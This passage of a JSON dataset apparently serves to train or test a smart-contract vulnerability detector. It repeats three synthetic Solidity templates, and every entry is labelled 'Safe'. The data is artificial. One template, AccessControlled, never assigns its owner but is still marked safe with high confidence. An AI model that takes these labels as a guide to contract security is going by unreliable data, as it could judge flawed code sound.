    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 242",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 243",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 244",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 245",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 246",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 247",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 248",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 249",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 250",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 251",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 252",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 253",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 254",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 255",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 256",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 257",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 258",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 259",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 260",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 261",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 262",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 263",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 264",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 265",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 266",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 267",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 268",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 269",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 270",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 271",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
